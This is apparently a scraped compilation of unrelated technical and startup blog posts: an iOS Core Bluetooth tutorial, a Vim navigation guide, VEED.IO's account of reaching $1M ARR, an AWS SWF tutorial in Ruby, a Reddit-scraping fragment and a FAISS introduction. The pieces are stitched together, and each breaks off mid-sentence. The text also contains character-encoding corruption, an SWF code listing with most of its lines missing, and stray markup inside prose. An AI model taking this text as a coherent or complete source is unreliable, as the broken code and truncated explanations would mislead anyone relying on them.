<p>Peripherals make themselves discoverable to centrals by broadcasting advertisement packets defining the main identifying service they offer. When a central scanning at the same time detects these packets and determines that the peripheral device it found supports the same class of service that it is searching for, it can begin the process of connecting. Traditionally, while only the main service of the device is advertised, once a connection is formed, the central can then query the peripheral for any additional services it offers.</p>
<p>In order for the central to determine it is compatible with a peripheral, it needs to know the ID values of the services that the peripheral supports. For very specific apps and peripheral devices, it makes sense to define a service using a shared UUID between both devices.</p>
<p>However, in more general practice, it makes sense for peripherals to adopt Bluetooth services that are a standard capability globally. For example, it would make sense that any device that records blood pressure readings could be connected to <em>any</em> Bluetooth device capable of processing that data, regardless of who manufactured either device. As such, <a href="https://www.bluetooth.com/specifications/gatt/services/">a public database exists</a> that lists a standardized set of service IDs that can be used between both centrals and peripherals who want to adopt a specific use case.</p>
<h3 id="characteristics">Characteristics</h3>
<p>For any given service, any number of separate sets of information and/or services might be included within it. For example, a heart rate sensor peripheral might feature a heart rate service, but then contained within that service is both the raw current heart rate value along with information on where the sensor is positioned over the wearer at the time.</p>
<p>As such, services may contain any number of â€œcharacteristicsâ€� which record various types of data, or perform various sub-functions of the service itself. They may be used to receive data from the peripheral, or send commands back to the peripheral. It is possible for centrals to explicitly query for information from a characteristic, or register an observer that will be called every time the characteristic has an update.</p>
<p>This concept of Bluetooth devices offering their capabilities as services and characteristics is officially called GATT, which is short for Generic Attribute Profile.</p>
<h3 id="corebluetoothconceptssummary">Core Bluetooth Concepts Summary</h3>
<p>Hopefully by this point, the basic layout of Core Bluetooth is starting to make sense to you. Parent devices are called centrals, and they connect to child devices known as peripherals. Peripherals manage their capabilities as services, who then manage their own capabilities via characteristics.</p>
<h2 id="puttingitallintopractice">Putting it all into practice</h2>
<p>Now that we've discussed the basic concepts of Core Bluetooth, we can start putting them into practice. For demonstrating the flow of connecting two devices, I've built a companion sample app around Core Bluetooth. The app is a very basic chat app that allows two devices to connect to each other, and to then send messages between each other. The app demonstrates how to both scan as a central and advertise a peripheral. Once connected, the app can then send messages both upstream and downstream through one pipeline.</p>
<h3 id="gettingstarted">Getting Started</h3>
<p>For starters, before we do anything else, we need to add the <code>NSBluetoothAlwaysUsageDescription</code> key to our app's Info.plist describing why we want to use Bluetooth. If this key isn't present, not only would the app be rejected by the App Store on submission, but the app itself throws an exception when trying to call any Core Bluetooth APIs. This is a security requirement of Apple, as all apps must get explicit permission from the user before Bluetooth is enabled. For our case, let's explain we need Bluetooth to enable our chat service.</p>
<pre><code><span>Access</span> <span>to</span> Bluetooth allows you <span>to</span> chat <span>with</span> others <span>from</span> their own devices!
</code></pre>
<p>Once that's in place, we can start using Core Bluetooth. In Swift, every source file that integrates the framework must have the following import statement.</p>
<pre><code><span>import</span> CoreBluetooth
</code></pre>
<h3 id="scanningasacentral">Scanning as a Central</h3>
<p>For iOS devices that fill the role of the central in a Bluetooth connection, they are represented by an object called <code>CBCentralManager</code>.</p>
<p>To begin, let's create a new instance:</p>
<pre><code><span>let</span> centralManager = <span>CBCentralManager</span>(delegate: <span>self</span>, queue: <span>nil</span>)
</code></pre>
<p>As you can see, an object must be designated as a delegate upon instantiation. This object must conform to <code>CBCentra…</code></p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>When editing a file, it’s quite crucial that you can navigate your cursor around rather quickly. <a href="https://www.vim.org/">Vim</a> and <a href="https://neovim.io/">NeoVim</a> allow for many different ways of doing so which, depending on the situation, can be more or less efficient and useful. This article examines the different ways of moving the cursor and compares them. Here, the term “efficiency” refers to navigating the cursor with as little time and effort (i.e. the number of keystrokes) as possible.</p>
<h2 id="using-the-mouse">Using the Mouse</h2>
<p><strong>TL;DR: Not recommended</strong></p>
<p>Using the mouse pointer to navigate Vim may seem like an obvious choice for users coming from a GUI editor like <a href="https://code.visualstudio.com/">Visual Studio Code</a> or similar. However, in Vim, the goal is to keep your fingers on the “home row” of the keyboard (the row where the <code>F</code> and the <code>J</code> keys reside) and not having to move them greatly towards the touchpad or even the mouse. This should reduce the strain on your hands and wrists and make editing more efficient. Therefore, navigating with the mouse should be highly discouraged in most situations and is even disabled by default.</p>
<p>It can be helpful to enable it for users transitioning from one of the aforementioned editors who would like to have a smooth transition by allowing themselves to use the mouse initially and switching it back off again later in their learning journey. To turn on mouse navigation, add the following to your configuration file (either <code>~/.vimrc</code> or <code>~/.config/nvim/init.vim</code>):</p>
<div><pre><code data-lang="vim"><span>" Temporarily enable mouse support</span><span>
</span><span></span><span>set</span> <span>mouse</span>=<span>a</span><span>
</span></code></pre></div><p>This will allow you to point and click to move the cursor and to scroll through the current buffer.</p>
<h2 id="using-the-arrow-keys">Using the Arrow Keys</h2>
<p><strong>TL;DR: Not recommended</strong></p>
<p>Again, for users used to other text editors or even word processing software like <a href="https://www.libreoffice.org/discover/writer/">LibreOffice Writer</a>, it may be tempting to use what they know. In these programs, you mostly use the arrow keys for keyboard-based navigation. This is not recommended because… you guessed it: They require the user to move their fingers away from the home row.</p>
<p>The alternative is, as described in the next section, to use the <code>h</code>, <code>j</code>, <code>k</code> and <code>l</code> keys on the keyboard which are conveniently placed at the center and where you most likely have your fingers most of the time.</p>
<h2 id="using-hjkl">Using h,j,k,l</h2>
<p><strong>TL;DR: Use for small navigations. Use in combination with relative line numbers.</strong></p>
<p><code>h</code>, <code>j</code>, <code>k</code> and <code>l</code> are the basic movement keys in Vim. They should be used instead of the usual arrow keys on the keyboard to, as discussed above, keep your fingers on the home row as much as possible. It takes a little practice but will pay off in the long run.</p>
<p>One hugely important thing to do with these keys is to not press them multiple times in sequence or even hold them down to move several columns or rows. As with many commands in Vim, they can be prefixed with numbers to move multiple times. For example, <code>12j</code> can be used rather than pressing the <code>j</code> key twelve times which is, obviously, much more efficient (3 vs. 12 keystrokes). However, it is recommendable to only use these keys for small movements and mostly to move lines up or down because there are more efficient ways of moving longer vertical distances or horizontal distances in general.</p>
<p>It can be very useful to enable relative line numbers to see at a glance what number to prefix <code>j</code> or <code>k</code> with to move to a certain line. They can be enabled by adding the following two lines to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Enable relative line numbers</span><span>
</span><span></span><span>set</span> <span>relativenumber</span><span>
</span><span></span><span>set</span> <span>number</span><span>
</span></code></pre></div><p>This will always show the absolute number of the line the cursor is currently on and relative numbers for all others.</p>
<h2 id="navigation-within-a-line">Navigation Within a Line</h2>
<p><strong>TL;DR: Mostly use <code>f</code>. Also consider <code>w</code>,<code>b</code>,<code>e</code>,<code>^</code> and <code>$</code>.</strong></p>
<p>So far, we’ve mostly looked at navigating from one line to another. The next step is to navigate within a line. In many cases, the straight forward thing to do is to use <code>w</code> or <code>W</code> to move to the next word, <code>b</code> or <code>B</code> to move to the previous word or even <code>e</code> or <code>E</code> to move directly to the end of the next word. For all of them, the lowercase variant considers a “word” to be what we intuitively see as one using delimiters like <code>-</code>, <code>/</code> or <code>.</code> to separate one word from another. The uppercase variant considers anything a word that is delimited by whitespace. Obviously, any of these commands can be prefixed with a number to jump multiple words in one go (e.g. <code>7w</code>). Other useful commands are <code>^</code> which moves to the first non-whitespace character of the line and <code>$</code> to move to the last character of a line. Considering the following line</p>
<p>with the cursor currently on the <code>g</code> character, pressing the following commands is the most efficient way to get to a specific target character:</p>
<table>
<thead>
<tr>
<th>Target Character</th>
<th>Command</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>j</code></td>
<td><code>2w</code></td>
</tr>
<tr>
<td><code>m</code></td>
<td><code>W</code></td>
</tr>
<tr>
<td><code>d</code></td>
<td><code>B</code></td>
</tr>
<tr>
<td><code>i</code></td>
<td><code>e</code></td>
</tr>
<tr>
<td><code>l</code></td>
<td><code>E</code></td>
</tr>
<tr>
<td><code>a</code></td>
<td><code>^</code> or <code>0</code></td>
</tr>
<tr>
<td><code>o</code></td>
<td><code>$</code></td>
</tr>
</tbody>
</table>
<p>When moving multiple words back and forth or to a specific place within a word, <code>t</code> and <code>f</code> are incredibly helpful. Especially <code>f</code> moves to the next occurrence of a specific character which lets you make big jumps within a line. The difference is that <code>f</code> moves to a character and <code>t</code> moves to right before a character. So <code>t</code> is mostly useful for deleting everything to a character. These commands’ uppercase variants <code>F</code> and <code>T</code> do the same thing but backwards. All of these commands can be “repeated” with the <code>;</code> command which jumps to the next occurrence of the targeted character while <code>,</code> jumps to the previous one.</p>
<h2 id="search">Search</h2>
<p><strong>TL;DR: Great for moving larger distances vertically and horizontally</strong></p>
<p>By far one of the most efficient ways of moving longer distances horizontally and vertically in a buffer is to use the search. The <code>/</code> key lets you search for a term and conveniently jump to its location. Pressing the <code>n</code> and <code>N</code> keys jumps to the next and previous occurrence of the search term respectively. The <code>?</code> key searches backwards from the current cursor position (which inverts <code>n</code> and <code>N</code>). Even though, the main purpose of the search command is obviously to search, it is an incredibly powerful tool to navigate quickly and efficiently.</p>
<p>The user experience of the search command can be vastly improved by adding the following settings to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Incrementally search while typing</span><span>
</span><span></span><span>set</span> <span>incsearch</span><span>
</span><span></span><span>" Use smart case for searching</span><span>
</span><span></span><span>set</span> <span>ignorecase</span><span>
</span><span></span><span>set</span> <span>smartcase</span><span>
</span><span></span><span>" Highlight searches</span><span>
</span><span></span><span>set</span> <span>hlsearch</span><span>
</span><span></span><span>" Use &lt;C-L&gt; to clear the highlighting of :set hlsearch.</span><span>
</span><span></span><span>if</span> <span>maparg</span>(<span>'&lt;C-L&gt;'</span>, <span>'n'</span>) ==# <span>''</span><span>
</span><span></span>  <span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>C</span>-<span>L</span>&gt; :<span>nohlsearch</span>&lt;<span>C</span>-<span>R</span>&gt;=<span>has</span>(<span>'diff'</span>)?<span>'&lt;Bar&gt;diffupdate'</span>:<span>''</span>&lt;<span>CR</span>&gt;&lt;<span>CR</span>&gt;&lt;<span>C</span>-<span>L</span>&gt;<span>
</span><span></span><span>endif</span><span>
</span></code></pre></div><p><code>incsearch</code> will make sure that the search pattern is applied incrementally while typing instead of only after pressing the enter key. The combination of <code>ignorecase</code> and <code>smartcase</code> ignores the case of the search term when not using any uppercase letters and doesn’t ignore it when using at least one uppercase letter which is quite convenient and surprisingly intuitive. <code>hlsearch</code> highlights any matches for the search term allowing to easily jump between them using <code>n</code> and <code>N</code>. The last statement lets you clear the highlighted search results by pressing <code>ctrl+l</code> to unclutter your view once done searching and jumping.</p>
<p>All in all, search is one of the powerful tools for intuitive and efficient navigation. It covers the common use case of knowing the word or part of a word to navigate to but not having your eyes directly pointed there yet. Furthermore, it’s simply the fastest way of jumping somewhere in many cases and beats other methods of navigation quite often in that regard.</p>
<h2 id="clunky-movements">Clunky Movements</h2>
<p><strong>TL;DR: Use for very specific use cases only. Consider <code>gg</code> and <code>G</code> for getting to know a file.</strong></p>
<p>In this section we’ll discuss what can be referred to as “clunky movements”. They let the user navigate larger distances in the buffer while sacrificing precision. These commands are less useful for exactly that reason. Vim can be a very efficient text editor by letting the user think about what they want to change, jumping precisely there with very few keystrokes, entering insert mode, performing a change with scalpel-like precision and finally exiting insert mode as soon as it’s done. The movement commands in this section however, get the cursor around the document as a whole while it’s hard for the user to predict at a glance, which line and column exactly they will land on.</p>
<p>A good example are the <code>H</code>, <code>M</code> and <code>L</code> keys which take the cursor to the top, the middle or the bottom of the current view port respectively. While this is a very big movement with just one keystroke, it’s highly likely that they won’t exactly get the cursor to the line needed but rather will have to be accompanied by pressing <code>j</code> or <code>k</code> multiple times which will result in much more thinking and many more keystrokes than what can be achieved with other methods. Similar are the <code>{</code> and <code>}</code> keys which take the cursor to the next paragraph (a block of text delimited by blank lines).</p>
<p>A useful exception to that are the <code>gg</code> and <code>G</code> commands which take the cursor to the first or the last line of a buffer respectively. It’s easy and effortless to predict where these movements will take you. Especially the <code>G</code> command can be quite useful because it allows to append to a file with just two keystrokes (<code>G</code> followed by <code>o</code>).</p>
<h2 id="plugins">Plugins</h2>
<p><strong>TL;DR: Install only the necessary plugins. Check out fzf!</strong></p>
<p>So far, we’ve only talked about features that are built into Vim or that can be configured on a vanilla installation. However, there are many useful plugins which can make navigating Vim even more efficient. It is important to carefully pick them though as any plugin can make Vim slower and/or less stable.</p>
<h3 id="fzf">fzf</h3>
<p>One of the most useful plugins is <a href="https://github.com/junegunn/fzf.vim">fzf</a> which is a great one to have in general. It offers many helpful commands like <code>:BLines</code> for searching the current buffer with intelligent fuzzy matching or <code>:Rg</code> for even searching the whole project for specific patterns which, in contrast to the other methods we’ve looked at so far, lets the user navigate between files. fzf is a tool that can be used for jumping between files and buffers but also between different locations within them. I highly recommend to check it out and add the following lines to your configuration file:</p>
<div><pre><code data-lang="vim"><span>" Jump to specific file</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>C</span>-<span>P</span>&gt; :<span>Files</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>" Search whole project</span><span>
</span><span></span><span>nnoremap</span> \ :<span>Rg</span>&lt;<span>space</span>&gt;<span>
</span></code></pre></div><p>The first line lets you open …</p></div></div>

                    <p>VEED.IO has grown fast.</p><p>12 months ago we turned on our paywall and made our first ever SaaS $1.</p><p>For any entrepreneur, this is a moment that they will never forget. Tim and I could not control our excitement.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_0318.jpeg"><figcaption>Our first ever $1 - 12 months ago</figcaption></figure><p>You achieved the impossible, there is light at the end of the tunnel and everything you have been dreaming about and working towards might come true!</p><p>Exactly 12 months after this first payment, we have managed to cross the seemingly impossible task of hitting $83,333 MRR / $1M ARR.</p><p>And the best part is we did it 100% self-funded, with no external funding.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG-20200703-WA0015-1.jpg"><figcaption>1M ARR - Tim &amp; Sabba - VEED.IO</figcaption></figure><p>In this post, I would like to share relevant financial data that might give other founders insights into how to build their own bootstrapped SaaS to $1M ARR.</p><p>I would also like to share some insights into our attitudes and believes that have got us to where we are. Such as our bullish attitude towards growth, how we build the product and how we think about the future of VEED.</p><h3 id="the-numbers">The Numbers</h3><p>First off, we are aware that we did this very fast and we also go lucky (I talk about this more below) From the outside, VEED might look like an overnight success, however it was 10 years in the making!</p><p>Before we look at the numbers, I would like to provide some context. When we started charging, we already had about 30,000 MAU. However, pretty much none of those users would speak to us and we were unsure that if we added the paywall any of the users would upgrade.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-149.png"><figcaption>1M ARR in 12 Months</figcaption></figure><p>Growth starts slow, but having a product that is scalable and can we assessed globally from day one really means the sky is the limit. 6 months in, our projection for 1M ARR was December, then August and due to increasing demand influenced by the pandemic, we hit 1M ARR in June. </p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-150.png"><figcaption>ARR Milestones</figcaption></figure><p>As you can see, the first $100K ARR took 171 days to reach and the following $100K took just 48 days. The reason why the 2nd was much quicker than the first is because we were learning from users and building the required product features. We were also learning more about our acquisition channels and were able to double down on them. </p><p>Although 171 days is not a very long period of time, turning up to the office and putting in 12 hours every day can be really draining. The stress of getting to profitability was really real. For bootstrapped startup, be aware that it can really take some time.</p><p>Like with anything with compounding growth your first 100K takes ages, but the next comes a lot quicker. It took 12 months for us to hit 1M ARR, however we are projected to hit 2M in just 4 months!</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/Accounts-Copy-151.png"><figcaption>1M ARR Traffic Growth</figcaption></figure><p>Bootstrapping is hard work, but as you grow it gets a lot easier. The speed in which you grow makes a HUGE difference to the bootstrapping experience. You need to get the flywheel moving super fast to keep everyone motivated and to get you to ramen profitability.</p><p>6 months after our first-ever paid users, we reached $10K MRR. Although a relatively small sum, it was enough to support the founding team.</p><p>This is important as it means you can donate 100% of your time building and growing your product.</p><p>However, if it took 18 months to reach this goal, the market would have moved on, our attitudes towards the product would have changed and maybe we would have been disillusioned. Otherwise known as the "Long, Slow, SaaS Ramp of Death"</p><p>From our experience, there are three keys to successfully bootstrapping.</p><h3 id="your-ideas-at-the-core-"><br>Your ideas at the core.</h3><p>A common mistake I often see is founders building way too much!</p><p>Building any app is hard work. If you set out to build a fully-fledged product you might never finish and more importantly, you are not getting valuable feedback from your users to help shape your product.</p><p>Setting the bar too high will also delay your launch and also make responding to feedback much harder due to a bloated codebase and feature set.</p><p>After years of building VEED, we don't even think we are at version 1.0.</p><p>We believe the best thing to do is to build your MVP and get it out into the world as soon as possible. The first version of VEED had only 4 features, Trim, Crop, Draw and Text. There was no login, no accounts, just a simple web app. Looking back, I think we made way too much, we should have launched with just a really good crop tool.</p><p>After we saw that users were responding well to your app, we started building new features that they had requested. This kickstarted our build measure learn process. So you need to find the minimum set of features that represents your idea.</p><h3 id="validate-your-ideas-fast-">Validate your ideas fast.</h3><p>When I first entered the startup world, I was under the impression that you needed a new and original idea. For many years I tried that approach with little to no success.</p><p>In my opinion, the best way to validate an idea is to look to see if this is a product people are already willing to pay for.</p><p>For example, I would feel comfortable that people are willing to pay for an email marketing tool. Why? Because Mailchimp has proven this for us!</p><p>This questions now is, how are you different or what subset of users do you believe they are undeserving?</p><p>For us at VEED, we knew people where the will to pay for video editing software (I know because I had an Adobe subscription myself). What we did differently is we just put it online and targeted, short-form content creators.</p><p>Why? Because we believe they were being underserved by legacy video editing platform. One of my fave tutors from art school once told me "An original idea is not something completely new, it just 10% different"</p><p>If it feels like you are pushing a boulder uphill and struggling to get traction, it might be time to move to the next idea. Seriously, the faster you can get to this realisation, the better. Don't let a "sunk cost" fallacy keep you working on the same idea.<br></p><h3 id="work-out-how-to-charge-for-your-product-early-on-">Work out how to charge for your product early on.</h3><p>Your funds will not last forever. We ran out of money before and had to go back to contract jobs. This ultimately set us back 6 months. To give your startup the best opportunity for success (I believe this both applies to Boostrapped &amp; VC backed startups, with some exceptions*) it has to generate revenue, a clear sign that you are creating value.</p><p>And charging for your product early on does a few things.</p><ol><li>Proves that users are willing to pay for it.</li><li>Provides you with better feedback (users care more if they are paying)</li><li>Lowers your burn rate and gets your closer to profitability.</li></ol><p>If you can't avoid writing a lot of code before you get your basic product live, you can follow the real estate showroom strategy!</p><p>When a property developer is building a new block of flats, the first thing they do is build a showroom and start selling! Then once someone is interested and buys, you can ask them what colour they want the walls and ask them what taps they would like in the bathroom.</p><p>Overall we have been laser-focused over the last 12 months. We have not gone to any conferences, pitched investors, built pointless pitch decks, entertained any partnerships. We have just been 100% focused on building VEED, learning from our users and growing the company.</p><h3 id="product">Product </h3><p>Our product development strategies are user-centric. Every user who signs up for VEED can book an on-boarding call with us. This process is time-consuming but provided incredible insight into who our users are, what they don't understand and what they need from VEED.</p><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_20200714_174440.jpg"><figcaption>User calls every day of the week</figcaption></figure><p>We have built new features fast and scrapped useless features even quicker. Overall we have put a lot of time into UX, but I must admit consistency with the design is sometimes lacking. But that is the cost we are willing to pay to move fast.</p><p>New paid users are also prompted to let us know why they chose VEED. We have collected over 500 of these responses and use them to inform our copy and also our focus.</p><h3 id="marketing">Marketing</h3><div><p>For the first 8 months, Tim has spent all of his time building the product and I (Sabba) have spent all of my time working on marketing. Admittedly, we were shameless and scrappy and had varying levels of success.</p><p>When starting VEED we knew nothing about marketing, so we made it our full-time job to learn and execute on our findings.</p></div><figure><img src="https://ghost-veed-blog.s3.eu-west-2.amazonaws.com/2020/07/IMG_20200714_174857.jpg"><figcaption>58 users a day was HUGE!!!</figcaption></figure><p>For first time founders, growth and marketing are often overlooked.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In this post I’m going to explore Simple Workflow Service (SWF) available in AWS.</p>

<p>To understand what SWF is good for, we need to first understand what a workflow is. <a href="https://en.wikipedia.org/wiki/Workflow">Wikipedia defines it</a> as follows:</p>

<blockquote>
  <p>A workflow consists of an orchestrated and repeatable pattern of activity, enabled by the systematic organization of resources into processes that transform materials, provide services, or process information. It can be depicted as a sequence of operations, the work of a person or group, the work of an organization of staff, or one or more simple or complex mechanisms.</p>
</blockquote>

<p>In computer systems we care about the part about processing information. Some things that could be modeled as workflows:</p>

<ul>
  <li><strong>Deployment pipeline</strong>: We could receive some code as input and then build it in a worker machine. We can run tests in parallel in different machines. If all tests pass we can deploy the binaries to another set of machines.</li>
  <li><strong>Coordinate shipments</strong>: A user buys a product on an online store and the order is placed on a system. A human monitors this system and takes care of finding the products in a warehouse and shipping them to the correct address. When the shipment is made, the information is entered in a system. The workflow notices this information an e-mails the user the shipping details.</li>
  <li><strong>Asynchronous image processing</strong>: A system uploads files to a system for processing (let’s say, create thumbnails). A workflow uses multiple workers to execute the task. If any of the machines fails while processing a set of files, they same work can be taken over by another worker.</li>
</ul>

<!--more-->

<p>Those are some high level examples. In this post I’m going to go over one example in more detail.</p>

<h2 id="components">Components</h2>

<p>Before we start building a workflow, let’s learn a little about the components of an SWF:</p>

<ul>
  <li><strong>Workflow</strong>: A set of activities, and some logic that defines how these work together to achieve some objective</li>
  <li><strong>Domain</strong>: A workflow lives in a domain. A Domain can contain multiple workflows. Workflows in different domains can’t interact</li>
  <li><strong>Execution</strong>: An instance of the workflow with its associated state</li>
  <li><strong>Event</strong>: Represents a change on the state of an execution</li>
  <li><strong>Starter</strong>: A program, or person that starts and execution</li>
  <li><strong>Activity</strong>: A type of task that needs to be performed, such as: resizing images, running tests, etc</li>
  <li><strong>Task</strong>: An invocation of an activity</li>
  <li><strong>Worker</strong>: Program that performs tasks</li>
  <li><strong>Decider</strong>: Program that defines the logic for the workflow</li>
</ul>

<h2 id="machine-repair-workflow">Machine repair workflow</h2>

<p>To help us get familiar with SWF, we are going to create a workflow to model the process for fixing a broken machine in a fleet. It will look something like this:</p>

<p><a href="https://ncona.com/images/posts/fixing-broken-machine-workflow.png"><img src="https://ncona.com/images/posts/fixing-broken-machine-workflow.png" alt="Fixing broken machine workflow"></a></p>

<p>This workflow can be used in a datacenter that runs a lot of machines. We can have the workflow probe machines to see if they are working well. If it notices something wrong, it sets the machine state as <code>maintenance</code> in a database. If it doesn’t find anything wrong, it finishes the execution.</p>

<p>Once a machine is drained we’ll do two things. We’ll have a person take a look at the machine and fix it and we’ll take the oportunity to reimage the machine so we have clean machine when it comes back.</p>

<p>Once the repair and the reimage are done, we can set the state back to <code>available</code> and finish the execution.</p>

<h2 id="getting-ready">Getting ready</h2>

<p>For our activities and the decider, we are going to need the AWS SDK. In this section I’m going to show how to get it ready.</p>

<p>We’ll use Ruby for our examples, since it’s easy to run and it’s very well supported. The latest version of the Ruby SDK at the time of this writing is version 3. We’ll create a <code>Gemfile</code> with dependencies:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>source</span> <span>'https://rubygems.org'</span>

<span>gem</span> <span>'aws-sdk-swf'</span><span>,</span> <span>'~&gt; 1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can then install them using:</p>



<p>The AWS SDK will need to communicate with AWS, so we’ll need some credentials, these credentials can be set in environment variables like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>export </span><span>AWS_ACCESS_KEY_ID</span><span>=</span>&lt;your key <span>id</span><span>&gt;</span>
<span>export </span><span>AWS_SECRET_ACCESS_KEY</span><span>=</span>&lt;your secret&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="activities">Activities</h2>

<p>Each of the boxes in the diagram above is an <code>activity</code>. Activities can be pretty self contained, so we’ll start building those.</p>

<p>An activity works by polling the workflow for pending tasks. If it finds that there is a task it can perform, it does so, and returns a result back. Polling then continues until there is more work to do.</p>

<p>Our activities will share some code with the decider, so let’s create a base class that will be shared between them (<code>workflow_base.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

    <span>begin</span>
      <span>swf</span><span>.</span><span>register_domain</span><span>({</span>
        <span>name: </span><span>domain_name</span><span>,</span>
        <span>workflow_execution_retention_period_in_days: </span><span>'3'</span>
      <span>})</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> registered"</span>
    <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>DomainAlreadyExistsFault</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> already exists"</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This class defines some constants that are shared between the decider and activities. It also initializes the SWF client and register the domain if it doesn’t yet exist.</p>

<p>Because of the way SWF works, it is best if the code for all our activities is handled by a single program. This program will poll for any new tasks in the domain. Every time it sees a task it will execute it and send the result back to SWF. Because each task is blocking, we could spin many copies of this program to allow tasks to be executed in parallel if we wanted to.</p>

To explore <span>and</span> mine Reddit<span>,</span> we need a way to access <span>all</span> of its exposed data<span>,</span> such <span>as</span> submissions<span>,</span> comments <span>and</span> users' information<span>.</span> The more brutal <span>and</span> straightforward way obviously <span>is</span> that of scrape the website itself<span>.</span> In particular<span>,</span> scraping Reddit would require a scraper<span>,</span> that <span>is</span> a software which should request one <span>or</span> more webpages<span>,</span> parse them <span>and</span> extract the information of interest<span>.</span> However<span>,</span> this <span>is</span> marginally doable <span>and</span> there are cases <span>in</span> which scraping a website would violate the Term of Service <span>(</span>ToS<span>)</span> of the website itself<span>.</span> Thus<span>,</span> we surely need another way to do it<span>.</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Measuring the similarity between vectors or arrays is a calculation that we encounter often while developing recommendation systems or other machine learning models. This often involves performing similarity searches on entire datasets that can be computationally expensive. For systems that require such calculations to happen online in real-time, this can be a major issue and is something we often have to deal with at Caboom.</p><p><br>Luckily, we are not the only ones faced with this problem and there are open-source libraries like <a href="https://github.com/facebookresearch/faiss">FAISS</a> that have been developed to solve this exact problem by the Facebook AI Research team.</p><p>‍</p><p>FAISS or <strong>F</strong>acebook <strong>AI</strong> <strong>S</strong>imilarity <strong>S</strong>earch is a library written in the C++ language with GPU support. It also has Python bindings so that it can be used with Numpy, Pandas, and other Python-based libraries. Its algorithmic enhancements that vastly narrow down the search space for a vector's k-nearest neighbors allow it to have much faster similarity search between vectors as compared to existing libraries like Scikit Learn. This technique is called Approximate Nearest Neighbours (ANN) search, and sacrifices some precision to obtain the vast speedups.&nbsp;</p><p>Compared to other ANN libraries FAISS implements various vector compression, partitioning, and indexing techniques, especially by making use of the parallelism enabled by GPUs to make similarity search lookups more efficient. We will mostly be focusing on its indexing features and how that leads to fast similarity search in recommender systems. There are several other methods and optimizations in FAISS which can’t be covered by this blog alone. For a detailed overview of how its internal mechanism works, different&nbsp; and the previous work it builds upon please refer <a href="https://github.com/facebookresearch/faiss/wiki">here</a>.</p><p>To show the speed gains obtained from using FAISS, we did a comparison of bulk cosine similarity calculation between the FlatL2 and IVFFlat indexes in FAISS and the brute-force similarity search used by one of the most popular Python machine learning frameworks Scikit-learn.&nbsp;</p><p>A dataset of 20k movies was used for this comparison, with the similarity search performed on vectors obtained from the various genres of the movie.The task was to select the top 10 most similar movies for each of the 20k movies from a candidate pool ranging from 0 to 1000 movies. </p><p>‍</p><figure id="w-node-0ec5b7e06d99-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c174333f77039795e2d8a_Screen%20Shot%202020-07-13%20at%2013.56.15.png" alt="Speed comparison between two FAISS indexes"></p></figure><figure id="w-node-cf497c7d8071-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c17886b4272e3e7bd2790_Screen%20Shot%202020-07-13%20at%2013.56.35.png" alt=""></p></figure><p>As seen from the plots above, the time taken to perform the similarity search increases linearly for Scikit-learn to a few seconds, while that for the Flat index based search is an order of magnitude faster.&nbsp;</p><h2>Basic Indexes</h2><p>As stated above the main strength of FAISS is the speed with which it can perform similarity searches on billions of vectors at the cost of some precision. This is possible because of the implementation of indexes in FAISS that the whole package is optimized for. These indexes store a set of vectors and provide search functions in these sets with various vector comparison algorithms. One good way of understanding them is to think of them like the indexes used in databases to make queries faster.&nbsp;</p><p>We will now go through an example implementation of creating a FAISS index.&nbsp;</p><h3>Flat Index</h3><p>The simplest implementation of the index in FAISS is the <strong>IndexFlatL2 index</strong>. It is an exact search index that encodes the vectors into fixed-size codes. As the name suggests it is an index that compares the L2 (euclidean) distance between vectors and returns the top-k similar vectors. During the search, all the indexed vectors are decoded sequentially, and compared to the vector whose nearest neighbors we are being calculated. This vector is also called the <strong>query vector</strong>.&nbsp;</p><p>This is different from how similarity search is done in libraries like Scikit-learn, as we have to choose the kind of similarity we are measuring and select the index accordingly. FAISS also optimizes how the index vectors are stored in memory or disk by using a tree data structure that hugely improves the search time.</p><p>The following code shows the process of defining the index vector size, initiating the IndexFlatL2 index, adding vectors to the index and saving the index into disk.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a67e212a15625c1ca46_Image1.png" alt=""></p></figure><p>‍</p><p>We can reuse the saved index later for searching a vector's nearest neighbors. The following code snippet shows how to load the index and perform nearest neighbor search on it.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a7a898b077ff2c73e44_image%202.png" alt=""></p></figure><p>‍</p><p>Output:<br>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a87898b072b2ac73e45_image%203.png" alt=""></p></figure><p>‍</p><p>‍</p><p>The output shows the resulting indexes and distances for the first five vectors of an index. In the second “distances” matrix we can see that the vectors have their nearest 